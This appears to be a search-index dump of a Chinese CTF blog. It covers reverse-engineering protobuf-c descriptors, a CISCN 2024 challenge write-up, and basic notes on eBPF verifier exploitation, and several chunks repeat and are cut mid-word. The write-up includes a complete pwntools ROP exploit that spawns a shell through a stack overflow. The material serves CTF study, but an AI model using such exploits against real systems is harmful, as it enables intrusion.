unsi","date":"2026-02-02","objectID":"/posts/protobuf/:0:4","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#label"},{"categories":["pwn"],"collections":null,"content":"手动逆向\rmessage\rsyntax = \"proto2\"; message Message_request{ required int32 id = 1; required string sender = 2; required uint32 len = 3; required bytes content = 4; required int32 actionid = 5; } message Message_response{ required int32 id = 1; required string receiver = 2; required int32 status_code = 3; optional string error_message = 4; } 如果定义了两个message，我们去IDA中查看字符串，搜索message就会发现： 这里会出现message的名字，并知道定义了几个message 成员\r一般从rodata从上往下看，看到的第一个一般都是string中的第一个，这里的第一个就是message_request。在IDA里： 往下找还能找到另一个message的成员： 因为上面有id了，这里的id就不会显示 更准确的查看成员的话，可以点击旁边的; DATA XREF: .data.rel.ro:0000000000003CD0↓o，就能查看引用 这会跳到.data.rel.ro段，跳到的这里，一片地址都是同一个message的成员 字段描述符\r了解完有哪些message，每个message有哪些成员，接下来就是每个成员的类型 这就要到.data.rel.ro去看了 proto文件： syntax = \"proto2\"; message User { required int32 id = 1; required string name = 2; optional string email = 3; } message User2 { required int32 id_2 = 1; required string name = 2; optional string email_2 = 3; } 用IDA打开 这里取User的name成员来分析 .data.rel.ro:0000000000003A68 dq offset aName ; \"name\" .data.rel.ro:0000000000003A70 db 2 .data.rel.ro:0000000000003A71 db 0 .data.rel.ro:0000000000003A72 db 0 .data.rel.ro:0000000000003A73 db 0 .data.rel.ro:0000000000003A74 db 0 .data.rel.ro:0000000000003A75 db 0 .data.rel.ro:0000000000003A76 db 0 .data.rel.ro:0000000000003A77 db 0 .data.rel.ro:0000000000003A78 db 0Eh .data.rel.ro:0000000000003A79 db 0 .data.rel.ro:0000000000003A7A db 0 .data.rel.ro:0000000000003A7B db 0 .data.rel.ro:0000000000003A7C db 0 .data.rel.ro:0000000000003A7D db 0 .data.rel.ro:0000000000003A7E db 0 .data.rel.ro:0000000000003A7F db 0 .data.rel.ro:0000000000003A80 db 20h .data.rel.ro:0000000000003A81 db 0 .data.rel.ro:0000000000003A82 db 0 .data.rel.ro:0000000000003A83 db 0 .data.rel.ro:0000000000003A84 db 0 .data.rel.ro:0000000000003A85 db 0 .data.rel.ro:0000000000003A86 db 0 .data.rel.ro:0000000000003A87 db 0 .data.rel.ro:0000000000003A88 db 0 .data.rel.ro:0000000000003A89 db 0 .data.rel.ro:0000000000003A8A db 0 .data.rel.ro:0000000000003A8B db 0 .data.rel.ro:0000000000003A8C db 0 .data.rel.ro:0000000000003A8D db 0 .data.rel.ro:0000000000003A8E db 0 .data.rel.ro:0000000000003A8F db 0 .data.rel.ro:0000000000003A90 db 0 .data.rel.ro:0000000000003A91 db 0 .data.rel.ro:0000000000003A92 db 0 .data.rel.ro:0000000000003A93 db 0 .data.rel.ro:0000000000003A94 db 0 .data.rel.ro:0000000000003A95 db 0 .data.rel.ro:0000000000003A96 db 0 .data.rel.ro:0000000000003A97 db 0 .data.rel.ro:0000000000003A98 db 0 .data.rel.ro:0000000000003A99 db 0 .data.rel.ro:0000000000003A9A db 0 .data.rel.ro:0000000000003A9B db 0 .data.rel.ro:0000000000003A9C db 0 .data.rel.ro:0000000000003A9D db 0 .data.rel.ro:0000000000003A9E db 0 .data.rel.ro:0000000000003A9F db 0 .data.rel.ro:0000000000003AA0 db 0 .data.rel.ro:0000000000003AA1 db 0 .data.rel.ro:0000000000003AA2 db 0 .data.rel.ro:0000000000003AA3 db 0 .data.rel.ro:0000000000003AA4 db 0 .data.rel.ro:0000000000003AA5 db 0 .data.rel.ro:0000000000003AA6 db 0 .data.rel.ro:0000000000003AA7 db 0 .data.rel.ro:0000000000003AA8 db 0 .data.rel.ro:0000000000003AA9 db 0 .data.rel.ro:0000000000003AAA db 0 .data.rel.ro:0000000000003AAB db 0 .data.rel.ro:0000000000003AAC db 0 .data.rel.ro:0000000000003AAD db 0 .data.rel.ro:0000000000003AAE db 0 .data.rel.ro:0000000000003AAF db 0 这里其实就是对应这个结构体（proto3去掉了default_value字段）： struct ProtobufCFieldDescriptor { const char *name; // 0x00 - 指向字段名的字符串 unsigned int id; // 0x08 - 字段编号 unsigned int label; // 0x0C - required/optional/repeated unsigned int type; // 0x10 - protobuf 类型 (int32=1, string=14 等) unsigned int quantifier_offset; // 0x14 - has_xxx 或 array length 偏移 unsigned int offset; // 0x18 - 在 message struct 里的偏移 unsigned int _pad0; // 0x1C - 对齐 const void *descriptor; // 0x20 - 嵌套 message/enum 描述符 const void *default_value; // 0x28 - 默认值 unsigned int flags; // 0x30 unsigned int reserved; // 0x34 }; 导入IDA的话： typedef void (__fastcall *ProtobufCMessageInit)(void *msg); struct ProtobufCIntRange { int start_value; int orig_index; }; struct ProtobufCFieldDescriptor { unsi","date":"2026-02-02","objectID":"/posts/protobuf/:0:4","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#type"},{"categories":["pwn"],"collections":null,"content":"手动逆向\rmessage\rsyntax = \"proto2\"; message Message_request{ required int32 id = 1; required string sender = 2; required uint32 len = 3; required bytes content = 4; required int32 actionid = 5; } message Message_response{ required int32 id = 1; required string receiver = 2; required int32 status_code = 3; optional string error_message = 4; } 如果定义了两个message，我们去IDA中查看字符串，搜索message就会发现： 这里会出现message的名字，并知道定义了几个message 成员\r一般从rodata从上往下看，看到的第一个一般都是string中的第一个，这里的第一个就是message_request。在IDA里： 往下找还能找到另一个message的成员： 因为上面有id了，这里的id就不会显示 更准确的查看成员的话，可以点击旁边的; DATA XREF: .data.rel.ro:0000000000003CD0↓o，就能查看引用 这会跳到.data.rel.ro段，跳到的这里，一片地址都是同一个message的成员 字段描述符\r了解完有哪些message，每个message有哪些成员，接下来就是每个成员的类型 这就要到.data.rel.ro去看了 proto文件： syntax = \"proto2\"; message User { required int32 id = 1; required string name = 2; optional string email = 3; } message User2 { required int32 id_2 = 1; required string name = 2; optional string email_2 = 3; } 用IDA打开 这里取User的name成员来分析 .data.rel.ro:0000000000003A68 dq offset aName ; \"name\" .data.rel.ro:0000000000003A70 db 2 .data.rel.ro:0000000000003A71 db 0 .data.rel.ro:0000000000003A72 db 0 .data.rel.ro:0000000000003A73 db 0 .data.rel.ro:0000000000003A74 db 0 .data.rel.ro:0000000000003A75 db 0 .data.rel.ro:0000000000003A76 db 0 .data.rel.ro:0000000000003A77 db 0 .data.rel.ro:0000000000003A78 db 0Eh .data.rel.ro:0000000000003A79 db 0 .data.rel.ro:0000000000003A7A db 0 .data.rel.ro:0000000000003A7B db 0 .data.rel.ro:0000000000003A7C db 0 .data.rel.ro:0000000000003A7D db 0 .data.rel.ro:0000000000003A7E db 0 .data.rel.ro:0000000000003A7F db 0 .data.rel.ro:0000000000003A80 db 20h .data.rel.ro:0000000000003A81 db 0 .data.rel.ro:0000000000003A82 db 0 .data.rel.ro:0000000000003A83 db 0 .data.rel.ro:0000000000003A84 db 0 .data.rel.ro:0000000000003A85 db 0 .data.rel.ro:0000000000003A86 db 0 .data.rel.ro:0000000000003A87 db 0 .data.rel.ro:0000000000003A88 db 0 .data.rel.ro:0000000000003A89 db 0 .data.rel.ro:0000000000003A8A db 0 .data.rel.ro:0000000000003A8B db 0 .data.rel.ro:0000000000003A8C db 0 .data.rel.ro:0000000000003A8D db 0 .data.rel.ro:0000000000003A8E db 0 .data.rel.ro:0000000000003A8F db 0 .data.rel.ro:0000000000003A90 db 0 .data.rel.ro:0000000000003A91 db 0 .data.rel.ro:0000000000003A92 db 0 .data.rel.ro:0000000000003A93 db 0 .data.rel.ro:0000000000003A94 db 0 .data.rel.ro:0000000000003A95 db 0 .data.rel.ro:0000000000003A96 db 0 .data.rel.ro:0000000000003A97 db 0 .data.rel.ro:0000000000003A98 db 0 .data.rel.ro:0000000000003A99 db 0 .data.rel.ro:0000000000003A9A db 0 .data.rel.ro:0000000000003A9B db 0 .data.rel.ro:0000000000003A9C db 0 .data.rel.ro:0000000000003A9D db 0 .data.rel.ro:0000000000003A9E db 0 .data.rel.ro:0000000000003A9F db 0 .data.rel.ro:0000000000003AA0 db 0 .data.rel.ro:0000000000003AA1 db 0 .data.rel.ro:0000000000003AA2 db 0 .data.rel.ro:0000000000003AA3 db 0 .data.rel.ro:0000000000003AA4 db 0 .data.rel.ro:0000000000003AA5 db 0 .data.rel.ro:0000000000003AA6 db 0 .data.rel.ro:0000000000003AA7 db 0 .data.rel.ro:0000000000003AA8 db 0 .data.rel.ro:0000000000003AA9 db 0 .data.rel.ro:0000000000003AAA db 0 .data.rel.ro:0000000000003AAB db 0 .data.rel.ro:0000000000003AAC db 0 .data.rel.ro:0000000000003AAD db 0 .data.rel.ro:0000000000003AAE db 0 .data.rel.ro:0000000000003AAF db 0 这里其实就是对应这个结构体（proto3去掉了default_value字段）： struct ProtobufCFieldDescriptor { const char *name; // 0x00 - 指向字段名的字符串 unsigned int id; // 0x08 - 字段编号 unsigned int label; // 0x0C - required/optional/repeated unsigned int type; // 0x10 - protobuf 类型 (int32=1, string=14 等) unsigned int quantifier_offset; // 0x14 - has_xxx 或 array length 偏移 unsigned int offset; // 0x18 - 在 message struct 里的偏移 unsigned int _pad0; // 0x1C - 对齐 const void *descriptor; // 0x20 - 嵌套 message/enum 描述符 const void *default_value; // 0x28 - 默认值 unsigned int flags; // 0x30 unsigned int reserved; // 0x34 }; 导入IDA的话： typedef void (__fastcall *ProtobufCMessageInit)(void *msg); struct ProtobufCIntRange { int start_value; int orig_index; }; struct ProtobufCFieldDescriptor { unsi","date":"2026-02-02","objectID":"/posts/protobuf/:0:4","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#版本"},{"categories":["pwn"],"collections":null,"content":"手动逆向\rmessage\rsyntax = \"proto2\"; message Message_request{ required int32 id = 1; required string sender = 2; required uint32 len = 3; required bytes content = 4; required int32 actionid = 5; } message Message_response{ required int32 id = 1; required string receiver = 2; required int32 status_code = 3; optional string error_message = 4; } 如果定义了两个message，我们去IDA中查看字符串，搜索message就会发现： 这里会出现message的名字，并知道定义了几个message 成员\r一般从rodata从上往下看，看到的第一个一般都是string中的第一个，这里的第一个就是message_request。在IDA里： 往下找还能找到另一个message的成员： 因为上面有id了，这里的id就不会显示 更准确的查看成员的话，可以点击旁边的; DATA XREF: .data.rel.ro:0000000000003CD0↓o，就能查看引用 这会跳到.data.rel.ro段，跳到的这里，一片地址都是同一个message的成员 字段描述符\r了解完有哪些message，每个message有哪些成员，接下来就是每个成员的类型 这就要到.data.rel.ro去看了 proto文件： syntax = \"proto2\"; message User { required int32 id = 1; required string name = 2; optional string email = 3; } message User2 { required int32 id_2 = 1; required string name = 2; optional string email_2 = 3; } 用IDA打开 这里取User的name成员来分析 .data.rel.ro:0000000000003A68 dq offset aName ; \"name\" .data.rel.ro:0000000000003A70 db 2 .data.rel.ro:0000000000003A71 db 0 .data.rel.ro:0000000000003A72 db 0 .data.rel.ro:0000000000003A73 db 0 .data.rel.ro:0000000000003A74 db 0 .data.rel.ro:0000000000003A75 db 0 .data.rel.ro:0000000000003A76 db 0 .data.rel.ro:0000000000003A77 db 0 .data.rel.ro:0000000000003A78 db 0Eh .data.rel.ro:0000000000003A79 db 0 .data.rel.ro:0000000000003A7A db 0 .data.rel.ro:0000000000003A7B db 0 .data.rel.ro:0000000000003A7C db 0 .data.rel.ro:0000000000003A7D db 0 .data.rel.ro:0000000000003A7E db 0 .data.rel.ro:0000000000003A7F db 0 .data.rel.ro:0000000000003A80 db 20h .data.rel.ro:0000000000003A81 db 0 .data.rel.ro:0000000000003A82 db 0 .data.rel.ro:0000000000003A83 db 0 .data.rel.ro:0000000000003A84 db 0 .data.rel.ro:0000000000003A85 db 0 .data.rel.ro:0000000000003A86 db 0 .data.rel.ro:0000000000003A87 db 0 .data.rel.ro:0000000000003A88 db 0 .data.rel.ro:0000000000003A89 db 0 .data.rel.ro:0000000000003A8A db 0 .data.rel.ro:0000000000003A8B db 0 .data.rel.ro:0000000000003A8C db 0 .data.rel.ro:0000000000003A8D db 0 .data.rel.ro:0000000000003A8E db 0 .data.rel.ro:0000000000003A8F db 0 .data.rel.ro:0000000000003A90 db 0 .data.rel.ro:0000000000003A91 db 0 .data.rel.ro:0000000000003A92 db 0 .data.rel.ro:0000000000003A93 db 0 .data.rel.ro:0000000000003A94 db 0 .data.rel.ro:0000000000003A95 db 0 .data.rel.ro:0000000000003A96 db 0 .data.rel.ro:0000000000003A97 db 0 .data.rel.ro:0000000000003A98 db 0 .data.rel.ro:0000000000003A99 db 0 .data.rel.ro:0000000000003A9A db 0 .data.rel.ro:0000000000003A9B db 0 .data.rel.ro:0000000000003A9C db 0 .data.rel.ro:0000000000003A9D db 0 .data.rel.ro:0000000000003A9E db 0 .data.rel.ro:0000000000003A9F db 0 .data.rel.ro:0000000000003AA0 db 0 .data.rel.ro:0000000000003AA1 db 0 .data.rel.ro:0000000000003AA2 db 0 .data.rel.ro:0000000000003AA3 db 0 .data.rel.ro:0000000000003AA4 db 0 .data.rel.ro:0000000000003AA5 db 0 .data.rel.ro:0000000000003AA6 db 0 .data.rel.ro:0000000000003AA7 db 0 .data.rel.ro:0000000000003AA8 db 0 .data.rel.ro:0000000000003AA9 db 0 .data.rel.ro:0000000000003AAA db 0 .data.rel.ro:0000000000003AAB db 0 .data.rel.ro:0000000000003AAC db 0 .data.rel.ro:0000000000003AAD db 0 .data.rel.ro:0000000000003AAE db 0 .data.rel.ro:0000000000003AAF db 0 这里其实就是对应这个结构体（proto3去掉了default_value字段）： struct ProtobufCFieldDescriptor { const char *name; // 0x00 - 指向字段名的字符串 unsigned int id; // 0x08 - 字段编号 unsigned int label; // 0x0C - required/optional/repeated unsigned int type; // 0x10 - protobuf 类型 (int32=1, string=14 等) unsigned int quantifier_offset; // 0x14 - has_xxx 或 array length 偏移 unsigned int offset; // 0x18 - 在 message struct 里的偏移 unsigned int _pad0; // 0x1C - 对齐 const void *descriptor; // 0x20 - 嵌套 message/enum 描述符 const void *default_value; // 0x28 - 默认值 unsigned int flags; // 0x30 unsigned int reserved; // 0x34 }; 导入IDA的话： typedef void (__fastcall *ProtobufCMessageInit)(void *msg); struct ProtobufCIntRange { int start_value; int orig_index; }; struct ProtobufCFieldDescriptor { unsi","date":"2026-02-02","objectID":"/posts/protobuf/:0:4","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#偏移问题"},{"categories":["pwn"],"collections":null,"content":"脚本\r写脚本要用到google对protobuf支持的第三方库。如果没安装，运行脚本时候会显示没有google库。 pip3 install protobuf==3.20.3 这里protobuf的版本要用到3.20.x（只有1 2 3），如果没指定版本直接安装了最新版，运行脚本的时候python会提示版本不兼容，protobuf版本过低，要更新protobuf，否则使用3.20.x版本的python库。安装完这个之后，环境就算是配置好了。 逆出proto文件后： protoc --python_out=. message.proto 再导入就好了 相关脚本： import message_pb2 pl=b'a'*0x218+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system) message = message_pb2.protoMessage() message.buffer = pl message.size = len(pl) pl = message.SerializeToString() p.send(pl) 参考文章https://hackmd.io/@jsjsj/BkpBdW17kl https://bbs.kanxue.com/thread-282203.htm https://xz.aliyun.com/news/15171 https://c-lby.top/2024/protobuf-install/ ","date":"2026-02-02","objectID":"/posts/protobuf/:0:5","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#脚本"},{"categories":["pwn"],"collections":null,"content":"例题\rCISCN 2024 华中赛区半决赛\r工具逆向 创建软链接，然后程序就能运行了 ln -s /home/ctf/pwn/CISCN/protoverflow/libprotobuf.so.10 /usr/lib/libprotobuf.so.10 反编译后发现一行代码: v5 = google::protobuf::MessageLite::ParseFromArray((google::protobuf::MessageLite *)\u0026unk_209080, s, v6); 其实这行代码是在对传入的数据用protocol buffers的方式进行解密，所以我们传入的数据就需要用protocol buffers加密之后再传入，这样才能正常parse 把s中长度v6的内容parse后存入\u0026unk_209080。解析成功返回true 相关的一些东西，不给题目中的是ParseFromArray： bool SerializeToString(string* output) const;: serializes the message and stores the bytes in the given string. Note that the bytes are binary, not text; we only use the string class as a convenient container. bool ParseFromString(const string\u0026 data);: parses a message from the given string. 用pbtk解析： syntax = \"proto2\"; message protoMessage { optional string name = 1; optional string phoneNumber = 2; required bytes buffer = 3; required uint32 size = 4; } protoc --python_out=. message.proto 然后使用这个语句编译成可以导入到python的文件 得到对应文件之后，我们需要导入exp中 from pwn import * import message_pb2 漏洞点在sub_324A的memcpy栈溢出 exp: from pwn import * import message_pb2 context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) # leak libc p.recvuntil(b'Gift: ') gift = int(p.recv(14), 16) libc_base = gift - libc.sym['puts'] libc.address = libc_base success(\"libc_base = \" + hex(libc_base)) # rop system = libc.sym['system'] binsh = next(libc.search(b'/bin/sh\\x00')) ret = next(libc.search(asm('ret'), executable=True)) pop_rdi = next(libc.search(asm('pop rdi; ret'), executable=True)) pop_rsi = next(libc.search(asm('pop rsi; ret'), executable=True)) pop_rdx_r12 = next(libc.search(asm('pop rdx; pop r12; ret'), executable=True)) pl=b'a'*0x218+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system) message = message_pb2.protoMessage() message.buffer = pl message.size = len(pl) pl = message.SerializeToString() p.send(pl) p.interactive() ","date":"2026-02-02","objectID":"/posts/protobuf/:0:6","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#例题"},{"categories":["pwn"],"collections":null,"content":"例题\rCISCN 2024 华中赛区半决赛\r工具逆向 创建软链接，然后程序就能运行了 ln -s /home/ctf/pwn/CISCN/protoverflow/libprotobuf.so.10 /usr/lib/libprotobuf.so.10 反编译后发现一行代码: v5 = google::protobuf::MessageLite::ParseFromArray((google::protobuf::MessageLite *)\u0026unk_209080, s, v6); 其实这行代码是在对传入的数据用protocol buffers的方式进行解密，所以我们传入的数据就需要用protocol buffers加密之后再传入，这样才能正常parse 把s中长度v6的内容parse后存入\u0026unk_209080。解析成功返回true 相关的一些东西，不给题目中的是ParseFromArray： bool SerializeToString(string* output) const;: serializes the message and stores the bytes in the given string. Note that the bytes are binary, not text; we only use the string class as a convenient container. bool ParseFromString(const string\u0026 data);: parses a message from the given string. 用pbtk解析： syntax = \"proto2\"; message protoMessage { optional string name = 1; optional string phoneNumber = 2; required bytes buffer = 3; required uint32 size = 4; } protoc --python_out=. message.proto 然后使用这个语句编译成可以导入到python的文件 得到对应文件之后，我们需要导入exp中 from pwn import * import message_pb2 漏洞点在sub_324A的memcpy栈溢出 exp: from pwn import * import message_pb2 context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc # ip = \"\" # port = #p = remote(ip,port) # leak libc p.recvuntil(b'Gift: ') gift = int(p.recv(14), 16) libc_base = gift - libc.sym['puts'] libc.address = libc_base success(\"libc_base = \" + hex(libc_base)) # rop system = libc.sym['system'] binsh = next(libc.search(b'/bin/sh\\x00')) ret = next(libc.search(asm('ret'), executable=True)) pop_rdi = next(libc.search(asm('pop rdi; ret'), executable=True)) pop_rsi = next(libc.search(asm('pop rsi; ret'), executable=True)) pop_rdx_r12 = next(libc.search(asm('pop rdx; pop r12; ret'), executable=True)) pl=b'a'*0x218+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system) message = message_pb2.protoMessage() message.buffer = pl message.size = len(pl) pl = message.SerializeToString() p.send(pl) p.interactive() ","date":"2026-02-02","objectID":"/posts/protobuf/:0:6","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#ciscn-2024-华中赛区半决赛"},{"categories":["pwn"],"collections":null,"content":"参考文章\rhttps://xz.aliyun.com/news/15171 ","date":"2026-02-02","objectID":"/posts/protobuf/:0:7","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#参考文章"},{"categories":["pwn"],"collections":null,"content":"基础知识\r","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:0","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#基础知识"},{"categories":["pwn"],"collections":null,"content":"常用代码\r//gcc ./bpf.c -o bpf #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e //为了exit()函数 #include \u003cstdint.h\u003e //为了uint64_t等标准类型的定义 #include \u003cerrno.h\u003e //为了错误处理 #include \u003cunistd.h\u003e #include \u003clinux/bpf.h\u003e //位于/usr/include/linux/bpf.h, 包含BPF系统调用的一些常量, 以及一些结构体的定义 #include \u003csys/syscall.h\u003e //为了syscall() //类型转换, 减少warning, 也可以不要 #define ptr_to_u64(x) ((uint64_t)x) //对于系统调用的包装, __NR_bpf就是bpf对应的系统调用号, 一切BPF相关操作都通过这个系统调用与内核交互 int bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size) { return syscall(__NR_bpf, cmd, attr, size); } //用于保存BPF验证器的输出日志 #define LOG_BUF_SIZE 0x1000 char bpf_log_buf[LOG_BUF_SIZE]; //通过系统调用, 向内核加载一段BPF指令 int bpf_prog_load(enum bpf_prog_type type, const struct bpf_insn* insns, int insn_cnt, const char* license) { union bpf_attr attr = { .prog_type = type, //程序类型 .insns = ptr_to_u64(insns), //指向指令数组的指针 .insn_cnt = insn_cnt, //有多少条指令 .license = ptr_to_u64(license), //指向整数字符串的指针 .log_buf = ptr_to_u64(bpf_log_buf), //log输出缓冲区 .log_size = LOG_BUF_SIZE, //log缓冲区大小 .log_level = 2, //log等级 }; return bpf(BPF_PROG_LOAD, \u0026attr, sizeof(attr)); } //BPF程序就是一个bpf_insn数组, 一个struct bpf_insn代表一条bpf指令 struct bpf_insn bpf_prog[] = { { 0xb7, 0, 0, 0, 0x2 }, //初始化一个struct bpf_insn, 指令含义: mov r0, 0x2; { 0x95, 0, 0, 0, 0x0 }, //初始化一个struct bpf_insn, 指令含义: exit; }; int main(void){ //加载一个bpf程序 int prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, bpf_prog, sizeof(bpf_prog)/sizeof(bpf_prog[0]), \"GPL\"); if(prog_fd\u003c0){ perror(\"BPF load prog\"); exit(-1); } printf(\"prog_fd: %d\\n\", prog_fd); printf(\"%s\\n\", bpf_log_buf); //输出程序日志 } ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:1","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#常用代码"},{"categories":["pwn"],"collections":null,"content":"什么是ebpf\r我们熟悉的seccomp就是一个被attach到系统调用的bpf程序，每次进行系统调用前都会执行这个bpf程序，禁掉一些系统调用 line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A \u003c 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x00000002 if (A == open) goto 0009 0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00000000 return KILL ebpf的作用不仅局限于此，它能够attach到内核里几乎任何地方，在内核中存取数据等等 但是，这个bpf程序是我们自己写的，它还会被放入内核，这是不安全的，所以我们写的bpf程序会通过ebpf verifier进行检查，才能被放入内核 其次，bpf程序有他的一套架构（寄存器，指令集这些），所以他要被编译(JIT compilier)成x86的汇编，才能被执行 如果ebpf verifier能被绕过，那我们就能把我们写的bpf程序attach到某个地方，然后执行它进行提权。这也是ebpf pwn学习的主要内容：绕过ebpf verifier的检查，进行提权。 ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:2","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#什么是ebpf"},{"categories":["pwn"],"collections":null,"content":"bpf程序架构\r寄存器\reBPF 虚拟机一共有 11 个 64 位寄存器，一个程序计数器（PC）与一个固定大小的堆栈（通常为 512KB），在 x86 架构下的对应关系如下： eBPF 寄存器 映射 x86_64 寄存器 用途 R0 rax 函数返回值 R1 rdi argv1 R2 rsi argv2 R3 rdx argv3 R4 rcx argv4 R5 r8 argv5 R6 rbx callee 保存 R7 r13 callee 保存 R8 r14 callee 保存 R9 r15 callee 保存 R10（只读） rbp 堆栈指针寄存器 ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:3","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#bpf程序架构"},{"categories":["pwn"],"collections":null,"content":"bpf程序架构\r寄存器\reBPF 虚拟机一共有 11 个 64 位寄存器，一个程序计数器（PC）与一个固定大小的堆栈（通常为 512KB），在 x86 架构下的对应关系如下： eBPF 寄存器 映射 x86_64 寄存器 用途 R0 rax 函数返回值 R1 rdi argv1 R2 rsi argv2 R3 rdx argv3 R4 rcx argv4 R5 r8 argv5 R6 rbx callee 保存 R7 r13 callee 保存 R8 r14 callee 保存 R9 r15 callee 保存 R10（只读） rbp 堆栈指针寄存器 ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:3","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#寄存器"},{"categories":["pwn"],"collections":null,"content":"verifier\rverifier的主要工作包括： 验证结构，保证循环次数，不存在死循环（早期的内核禁止循环）；清理unreachable instructions 模拟执行每一条指令，观察寄存器和栈状态的变化，确保不存越界读写等不安全行为 寄存器状态跟踪\r状态类型 verifier会跟踪每个寄存器的状态，给每个寄存器分配一个struct bpf_reg_state，每个寄存器都有类型(type)，类型可以分为以下三大类： 未初始化寄存器(not_init)，还没经过赋值操作，使用会导致验证失败 标量寄存器(scalar_value)，被赋予了整型值，能进行算数运算，不能作为指针进行内存访问 指针寄存器(pointer type)，该寄存器为一个指针，verifier 会检查内存访问是否超出指针允许的范围 一些规则\rSCALAR 不能直接当指针用 允许ptr + known_safe_offset，ptr + unknown_scalar之后不能解引用（要进行边界检查才能解引用） ptr + ptr 禁止，ptr - ptr有条件允许：如果两个指针指向同一个内存对象，Verifier 允许相减来计算距离（offset）。结果会变成 SCALAR。但不同对象的指针相减是禁止的。 pointer 不能做任意算术运算，Mul, Div, Mod, Shift, And, Or, Xor 对指针都是非法的。只有 Add/Sub (offset) 是合法的。 ALU32 会 清零高 32 位 未初始化的寄存器 / stack 禁止使用（程序开始时，寄存器r1已经初始化为一个指针，类型为PTR_TO_CTX） 不能把一个内核指针（如 sk_buff 的地址）直接存到 Map 里，让用户态读取。 ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:4","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#verifier"},{"categories":["pwn"],"collections":null,"content":"verifier\rverifier的主要工作包括： 验证结构，保证循环次数，不存在死循环（早期的内核禁止循环）；清理unreachable instructions 模拟执行每一条指令，观察寄存器和栈状态的变化，确保不存越界读写等不安全行为 寄存器状态跟踪\r状态类型 verifier会跟踪每个寄存器的状态，给每个寄存器分配一个struct bpf_reg_state，每个寄存器都有类型(type)，类型可以分为以下三大类： 未初始化寄存器(not_init)，还没经过赋值操作，使用会导致验证失败 标量寄存器(scalar_value)，被赋予了整型值，能进行算数运算，不能作为指针进行内存访问 指针寄存器(pointer type)，该寄存器为一个指针，verifier 会检查内存访问是否超出指针允许的范围 一些规则\rSCALAR 不能直接当指针用 允许ptr + known_safe_offset，ptr + unknown_scalar之后不能解引用（要进行边界检查才能解引用） ptr + ptr 禁止，ptr - ptr有条件允许：如果两个指针指向同一个内存对象，Verifier 允许相减来计算距离（offset）。结果会变成 SCALAR。但不同对象的指针相减是禁止的。 pointer 不能做任意算术运算，Mul, Div, Mod, Shift, And, Or, Xor 对指针都是非法的。只有 Add/Sub (offset) 是合法的。 ALU32 会 清零高 32 位 未初始化的寄存器 / stack 禁止使用（程序开始时，寄存器r1已经初始化为一个指针，类型为PTR_TO_CTX） 不能把一个内核指针（如 sk_buff 的地址）直接存到 Map 里，让用户态读取。 ","date":"2026-02-02","objectID":"/posts/kernel_ebpfpwn/:1:4","tags":null,"title":"内核ebpfpwn（未完成版）","uri":"/posts/kernel_ebpfpwn/#寄存器状态跟踪"},{"categories":["pwn"],"collections":null,"content":"verifier\rverifier的主要工作包括： 验证结构，保证循环次数，不存在死循环（早期的内核禁止循环）；清理unreachable instructions 模拟执行每一条指令，观察寄存器和栈状态的变化，确保不存越界读写等不安全行为 寄存器状态跟踪\r状态类型 verifier会跟踪每个寄存器的状态，给每个寄存器分配一个struct bpf_reg_state，每个寄存器都有类型(type)，类型可以分为以下三大类： 未初始化寄存器(not_init)，还没经过赋值操作，使用会导致验证失败 标量寄存器(scalar_value)，被赋予了整型值，能进行算数运算，不能作为指针进行内存访问 指针寄存器(pointer type)，该寄存器为一个指针，verifier 会检查内存访问是否超出指针允许的范围 一些规则\rSCALAR 不能直接当指针用 允许ptr + known_safe_offset，ptr + unknown_scalar之后不能解引用（要进行边界检查才能解引用） ptr + ptr 禁止，ptr - ptr有条件允许：如果两个指针指向同一个内存对象，Verifier 允许相减来计算距离（offset）。结果会变成 SCALAR。但不同对象的指针相减是禁止的。 pointer 不能做任意算术运算，Mul, Div, Mod, Shift, And, Or, Xor 对指针都是非法的。只有 Add/Sub (offset) 是合法的。 ALU32 会 清零高 32 位 未初始化的寄存器 / stack 